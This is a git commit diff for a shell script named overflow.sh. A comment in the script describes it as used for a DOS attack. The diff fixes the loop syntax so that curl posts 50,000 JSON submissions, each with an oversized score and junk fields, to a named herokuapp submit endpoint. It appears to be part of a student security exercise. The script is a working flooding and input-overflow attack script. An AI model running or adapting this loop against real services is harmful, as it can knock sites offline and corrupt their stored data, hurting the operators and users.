f4a3909e7e650c445c7faf4df914da4a15573970
George Brown <gbrown3593@gmail.com>
2014-04-27 17:12:31 -0400

    updated abstract

--- security/scripts/overflow.sh
+++ security/scripts/overflow.sh
@@ -3,7 +3,7 @@
 # Used for a DOS attack
 # Thanks to Siddhartha Prasad for helping me with this script
 i=0 
-while [$i -lt 50000] 
+while [ $i -lt 50000 ] 
 do 
 curl --data '{"username":"overflowing!!!!!!!!!!!!", "score":"999999999999999999999999999999999999999999999999999999", "grid":"xxxxxxxxxxxxxxx"}' http://sleepy-atoll-6532.herokuapp.com/submit.json -H "Content-Type: application/json" 
 i=$(($i+1))
